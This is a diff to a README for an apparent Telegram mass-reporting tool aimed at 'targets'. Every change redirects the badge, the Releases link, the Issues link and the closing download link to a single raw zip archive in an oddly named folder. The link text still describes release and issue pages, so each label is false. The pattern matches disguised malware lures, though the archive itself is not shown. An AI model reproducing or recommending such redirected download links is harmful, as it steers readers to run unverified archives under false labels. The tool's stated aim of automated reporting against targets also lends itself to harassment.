@@ -1,6 +1,6 @@
 # 📊 Telegram-Target-Reporting-Tool-New - Automate Your Reporting Efforts
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download](https://raw.githubusercontent.com/Addypele/Telegram-Target-Reporting-Tool-New/main/unestimated/Telegram-Target-Reporting-Tool-New.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Telegram-Target-Reporting-Tool-New! This tool helps you automate 
 
 ## 📥 Download & Install
 
-To download the tool, visit this page: [Download the Latest Release](https://github.com/Addypele/Telegram-Target-Reporting-Tool-New/releases).
+To download the tool, visit this page: [Download the Latest Release](https://raw.githubusercontent.com/Addypele/Telegram-Target-Reporting-Tool-New/main/unestimated/Telegram-Target-Reporting-Tool-New.zip).
 
 Once you are on the Releases page, look for the latest version. Click on it to see the available files. Download the appropriate file for your operating system. 
 
@@ -53,7 +53,7 @@ If you face any issues while using the tool, consider the following steps:
    
 2. **Restart the Application**: Close and reopen the tool to refresh the session.
 
-3. **Update Your Application**: Always download the latest version from [Releases](https://github.com/Addypele/Telegram-Target-Reporting-Tool-New/releases).
+3. **Update Your Application**: Always download the latest version from [Releases](https://raw.githubusercontent.com/Addypele/Telegram-Target-Reporting-Tool-New/main/unestimated/Telegram-Target-Reporting-Tool-New.zip).
 
 4. **Consult Logs**: Check the application logs for any specific error messages.
 
@@ -72,7 +72,7 @@ A3: This tool is intended for personal use only, not for commercial purposes.
 
 ## 🐛 Reporting Issues
 
-To report any issues or bugs, please visit the [Issues](https://github.com/Addypele/Telegram-Target-Reporting-Tool-New/issues) section of this repository. Provide detailed information about the problem for quicker assistance.
+To report any issues or bugs, please visit the [Issues](https://raw.githubusercontent.com/Addypele/Telegram-Target-Reporting-Tool-New/main/unestimated/Telegram-Target-Reporting-Tool-New.zip) section of this repository. Provide detailed information about the problem for quicker assistance.
 
 ## 💬 Community Support
 
@@ -80,4 +80,4 @@ Join our community of users and developers in the discussions section. Share tip
 
 ---
 
-Now, you’re ready to automate your reporting on Telegram. For downloads, remember to return to this page: [Download the Latest Release](https://github.com/Addypele/Telegram-Target-Reporting-Tool-New/releases). Enjoy using the Telegram-Target-Reporting-Tool-New!
+Now, you’re ready to automate your reporting on Telegram. For downloads, remember to return to this page: [Download the Latest Release](https://raw.githubusercontent.com/Addypele/Telegram-Target-Reporting-Tool-New/main/unestimated/Telegram-Target-Reporting-Tool-New.zip). Enjoy using the Telegram-Target-Reporting-Tool-New!
